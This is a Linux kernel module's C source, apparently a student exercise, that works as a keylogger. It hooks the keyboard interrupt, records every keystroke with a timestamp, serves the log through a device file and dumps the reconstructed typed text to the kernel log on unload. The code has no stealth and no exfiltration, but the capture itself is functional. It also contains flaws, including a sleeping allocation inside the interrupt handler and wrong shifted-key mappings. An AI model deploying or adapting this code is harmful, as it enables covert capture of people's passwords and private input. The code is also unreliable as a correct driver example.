// SPDX-License-Identifier: GPL-2.0-or-later
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/time.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard bad keylogger");

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ		1
#define LOG_PAGE_SIZE		(PAGE_SIZE * 16)

struct key_map {
	char			ascii;
	char			ascii_up;
	unsigned int		scancode;
	const char		*name;
	const char		*upper_name;
	bool			pressed;
	size_t			press_count;
};

static struct key_map		*key_shift_left;
static struct key_map		*key_shift_right;

enum e_key_event {
	PRESS,
	RELEASE
};

// this structure describe a log entry
// key : witch key this key refers to, it will point on key_table
// timestamp : when this event occurred
// event : was it a press or a release ?

struct key_log_entry {
	const struct key_map	*key;
	struct tm		tm;
	enum e_key_event	event;
	bool			upper_case;
	size_t			press_count;
};

struct key_log_index {
	struct key_log_index	*prev;
	struct key_log_index	*next;
	size_t			available;
	size_t			used;
	struct key_log_entry	*entries;
};

static struct key_log_index	*key_full_log;

DEFINE_SPINLOCK(slock);

static struct key_log_index	*key_log_create_page(struct key_log_index *next)
{
	void		*ptr;
	size_t		blocks;

	ptr = kmalloc(LOG_PAGE_SIZE, GFP_KERNEL);
	if (!ptr)
		return NULL;
	blocks = (LOG_PAGE_SIZE - (sizeof(struct key_log_index))) /
		 sizeof(struct key_log_entry);
	pr_info("created a new page of %lu logs entries", blocks);
	memset(ptr, 0, LOG_PAGE_SIZE);
	*((struct key_log_index *)ptr) = (struct key_log_index) {
		.prev = NULL,
		.next = next,
		.available = blocks,
		.used = 0,
		.entries = (void *)((size_t)ptr + sizeof(struct key_log_index))
	};
	if (next)
		next->prev = ptr;
	return ptr;
}

static struct key_log_index	*key_log_last(struct key_log_index *lst)
{
	if (!lst)
		return NULL;
	while (lst->next)
		lst = lst->next;
	return lst;
}

static void		key_log_clean(void)
{
	struct key_log_index	*lst;
	struct key_log_index	*next;

	lst = key_full_log;
	while (lst) {
		next = lst->next;
		memset(lst, 0, LOG_PAGE_SIZE);
		kfree(lst);
		lst = next;
	}
	key_full_log = NULL;
}

static struct key_map key_table[] = {
	(struct key_map){0x0, 0x0, 0, "NUL", "NUL", false, 0},
	(struct key_map){0x1, 0x0, 1, "Escape", "Escape", false, 0},
	(struct key_map){'1', '!', 2, "1", "!", false, 0},
	(struct key_map){'2', '@', 3, "2", "@", false, 0},
	(struct key_map){'3', '#', 4, "3", "#", false, 0},
	(struct key_map){'4', '$', 5, "4", "$", false, 0},
	(struct key_map){'5', '5', 6, "5", "%", false, 0},
	(struct key_map){'6', '^', 7, "6", "^", false, 0},
	(struct key_map){'7', '&', 8, "7", "&", false, 0},
	(struct key_map){'8', '*', 9, "8", "*", false, 0},
	(struct key_map){'9', '(', 10, "9", "(", false, 0},
	(struct key_map){'0', ')', 11, "0", ")", false, 0},
	(struct key_map){'-', '_', 12, "-", "_", false, 0},
	(struct key_map){'=', '+', 13, "=", "+", false, 0},
	(struct key_map){0x0, 0x0, 14, "DEL", "DEL", false, 0},
	(struct key_map){'\t', '\t', 15, "TAB", "TAB", false, 0},
	(struct key_map){'q', 'Q', 16, "q", "Q", false, 0},
	(struct key_map){'w', 'W', 17, "w", "W", false, 0},
	(struct key_map){'e', 'E', 18, "e", "E", false, 0},
	(struct key_map){'r', 'R', 19, "r", "R", false, 0},
	(struct key_map){'t', 'T', 20, "t", "T", false, 0},
	(struct key_map){'y', 'Y', 21, "y", "Y", false, 0},
	(struct key_map){'u', 'U', 22, "u", "U", false, 0},
	(struct key_map){'i', 'I', 23, "i", "I", false, 0},
	(struct key_map){'o', 'O', 24, "o", "O", false, 0},
	(struct key_map){'p', 'P', 25, "p", "P", false, 0},
	(struct key_map){'[', '{', 26, "[", "{", false, 0},
	(struct key_map){']', '}', 27, "]", "}", false, 0},
	(struct key_map){'\n', '\n', 28, "Enter", "Enter", false, 0},
	(struct key_map){0x0, 0x0, 29, "Control-Left", "Control-Left", false, 0},
	(struct key_map){'a', 'A', 30, "a", "A", false, 0},
	(struct key_map){'s', 'S', 31, "s", "S", false, 0},
	(struct key_map){'d', 'D', 32, "d", "D", false, 0},
	(struct key_map){'f', 'F', 33, "f", "F", false, 0},
	(struct key_map){'g', 'G', 34, "g", "G", false, 0},
	(struct key_map){'h', 'H', 35, "h", "H", false, 0},
	(struct key_map){'j', 'J', 36, "j", "J", false, 0},
	(struct key_map){'k', 'K', 37, "k", "K", false, 0},
	(struct key_map){'l', 'L', 38, "l", "L", false, 0},
	(struct key_map){';', ':', 39, ";", ":", false, 0},
	(struct key_map){'\'', '"', 40, "'", "\"", false, 0},
	(struct key_map){'\'', '~', 41, "`", "~", false, 0},
	(struct key_map){0x0, 0x0, 42, "Shift-Left", "Shift-Left", false, 0},
	(struct key_map){'\\', '|', 43, "\\", "|", false, 0},
	(struct key_map){'z', 'Z', 44, "z", "Z", false, 0},
	(struct key_map){'x', 'X', 45, "x", "X", false, 0},
	(struct key_map){'c', 'C', 46, "c", "C", false, 0},
	(struct key_map){'v', 'V', 47, "v", "V", false, 0},
	(struct key_map){'b', 'B', 48, "b", "B", false, 0},
	(struct key_map){'n', 'N', 49, "n", "N", false, 0},
	(struct key_map){'m', 'M', 50, "m", "M", false, 0},
	(struct key_map){',', '<', 51, ",", "<", false, 0},
	(struct key_map){'.', '>', 52, ".", ">", false, 0},
	(struct key_map){'/', '?', 53, "/", "?", false, 0},
	(struct key_map){0x0, 0x0, 54, "Shift-Right", "Shift-Right", false, 0},
	(struct key_map){'*', '*', 55, "*", "*", false, 0},
	(struct key_map){0x0, 0x0, 56, "Alt-Right", "Alt-Right", false, 0},
	(struct key_map){' ', ' ', 57, "Space", "Space", false, 0},
	(struct key_map){0x0, 0x0, 58, "Caps-Lock", "Caps-Lock", false, 0},
	(struct key_map){0x0, 0x0, 71, "Home", "Home", false, 0},
	(struct key_map){0x0, 0x0, 72, "Arrow-Up", "Arrow-Up", false, 0},
	(struct key_map){0x0, 0x0, 73, "Page-Up", "Page-Up", false, 0},
	(struct key_map){'-', '-', 74, "-", "-", false, 0},
	(struct key_map){0x0, 0x0, 75, "Arrow-Left", "Page-Left", false, 0},
	(struct key_map){0x0, 0x0, 77, "Arrow-Right", "Arrow-Right", false, 0},
	(struct key_map){'+', '+', 78, "+", "+", false, 0},
	(struct key_map){0x0, 0x0, 79, "End", "END", false, 0},
	(struct key_map){0x0, 0x0, 80, "Arrow-Down", "Arrow-Down", false, 0},
	(struct key_map){0x0, 0x0, 81, "Page-Down", "Page-Down", false, 0},
	(struct key_map){0x0, 0x0, 82, "Insert", "Insert", false, 0},
	(struct key_map){'.', '.', 83, ".", ".", false, 0},
	(struct key_map){0x0, 0x0, 92, "Command-Right", "Command-Right", false, 0},
	(struct key_map){0x0, 0x0, 93, "Menu", "Menu", false, 0},
	(struct key_map){0x0, 0x0, 0, NULL, NULL, false, 0}
};

#define SCANCODE_ENTER	28
#define SCANCODE_SPACE	57
#define SCANCODE_CAPS	58

static bool		key_ignore_caps(const struct key_map *key)
{
	if (key->scancode >= 2 && key->scancode <= 13)
		return true;
	return false;
}

static struct key_map	*get_key(const unsigned int scancode)
{
	size_t		i;

	for (i = 0; key_table[i].name; i++) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
	}
	return NULL;
}

static void	key_prepare_show_entry(struct key_log_entry *log, void *ptr)
{
	struct seq_file *seq = ptr;

	if (!log | !log->key) {
		pr_err("this should never happen ! grade me with a 0 and go.");
		return;
	}
	seq_printf(seq,
		   "%02d::%02d::%02d -> Key: %-12s (%2u) - %8s - count: %4lu of %4lu (caps: %3s)\n",
		   log->tm.tm_hour, log->tm.tm_min, log->tm.tm_sec,
		   (log->upper_case) ? log->key->upper_name : log->key->name,
		   log->key->scancode,
		   (log->event == PRESS) ? "pressed" : "released",
		   log->press_count, log->key->press_count,
		   (log->upper_case) ? "yes" : "no");
}

static void	key_log_iter(void (*func)(struct key_log_entry *, void *),
			     void *data)
{
	struct key_log_index		*lst;
	size_t				i;

	for (lst = key_log_last(key_full_log); lst; lst = lst->prev) {
		for (i = 0; i < lst->used; i++)
			func(&lst->entries[i], data);
	}
}

static int	key_prepare_show(struct seq_file *seq, void *ptr)
{
	pr_info("show start\n");
	spin_lock(&slock);
	key_log_iter(key_prepare_show_entry, seq);
	spin_unlock(&slock);
	pr_info("show done.\n");
	return 0;
}

static int	open_key(struct inode *node, struct file *file)
{
	int	ret;

	pr_info("device open.\n");
	ret = single_open(file, &key_prepare_show, NULL);
	return ret;
}

static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	int	ret;

	pr_info("reading device\n");
	ret = seq_read(file, buf, size, offset);
	return ret;
}

static ssize_t	write_key(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	pr_info("writing on device\n");
	return -ENOSPC;
}

static int	release_key(struct inode *node, struct file *file)
{
	pr_info("device closed\n");
	return single_release(node, file);
}

static const struct file_operations ops = {
	.owner = THIS_MODULE,
	.open = open_key,
	.read = read_key,
	.write = write_key,
	.release = release_key,
	.llseek = seq_lseek,
};

static struct key_log_entry *key_create_entry(struct key_map *key,
					      const bool caps)
{
	struct timespec		ts;
	struct key_log_entry	*log;
	struct key_log_index	*page;

	// here we need a new page
	if (!key_full_log || key_full_log->available == 0) {
		page = key_log_create_page(key_full_log);
		if (!page) {
			pr_err("failed to create a new page !\n");
			return NULL;
		}
		key_full_log = page;
	}
	getnstimeofday(&ts);
	log = &key_full_log->entries[key_full_log->used];
	log->key = key;
	log->press_count = key->press_count;
	log->event = (key->pressed) ? PRESS : RELEASE;
	log->upper_case = key_shift_left->pressed | key_shift_right->pressed;
	// in case of caps lock we invert the comportement.
	if (caps && key_ignore_caps(key) == false)
		log->upper_case = !log->upper_case;
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &log->tm);
	key_full_log->used += 1;
	key_full_log->available -= 1;
	return log;
}

static struct workqueue_struct	*workqueue;

struct key_task {
	struct work_struct	task;
	unsigned int		scancode;
	bool			caps_lock;
};

static void		key_job(struct work_struct *work)
{
	struct key_task		*task = (struct key_task *)work;
	unsigned int		scancode = task->scancode;
	struct key_map		*key;

	spin_lock(&slock);
	key = get_key(scancode & 0x7f);
	if (key) {
		key->pressed = (scancode & 0x80) == 0;
		if (key->pressed)
			key->press_count += 1;
		key_create_entry(key, task->caps_lock);
	} else {
		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
			((scancode & 0x80) == 0 ? "pressed" : "released"));
	}
	spin_unlock(&slock);
	kfree(task);
}

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	struct key_task			*task;
	static bool			caps_lock = false;

	task = kmalloc(sizeof(*task), GFP_KERNEL);
	if (task) {
		task->scancode = inb(0x60);
		if (task->scancode == SCANCODE_CAPS)
			caps_lock = !caps_lock;
		task->caps_lock = caps_lock;
		INIT_WORK(&task->task, key_job);
		queue_work(workqueue, &task->task);
	}
	return IRQ_HANDLED;
}

static struct miscdevice		dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&ops
};

static void	key_logprint(struct key_log_entry *log, void *ptr)
{
	char		ascii;

	if (log->event != PRESS)
		return ;
	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
	if (ascii != 0x0)
		pr_info(KERN_CONT "%c", ascii);
	else
		pr_info(KERN_CONT "[%s]",
		    (log->upper_case ? log->key->upper_name : log->key->name));
}

static void		__exit keylogger_clean(void)
{
	pr_info(MODULE_NAME "Cleaning up module.\n");
	key_log_iter(&key_logprint, NULL);
	free_irq(KEYBOARD_IRQ, &key_handler);
	misc_deregister(&dev);
	if (workqueue) {
		flush_workqueue(workqueue);
		destroy_workqueue(workqueue);
	}
	key_log_clean();
}

static int		__init hello_init(void)
{
	int		ret;

	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
	workqueue = create_workqueue("keylogger");
	if (!workqueue) {
		pr_err("failed to create workqueue.");
		return -ENOMEM;
	}
	key_full_log = NULL;
	key_shift_left = get_key(42);
	key_shift_right = get_key(54);
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
			  &key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return ret;
	}
	ret = misc_register(&dev);
	if (ret < 0) {
		pr_err("failed to register device.\n");
		free_irq(KEYBOARD_IRQ, &key_handler);
		return 1;
	}
	return 0;
}

module_init(hello_init);
module_exit(keylogger_clean);
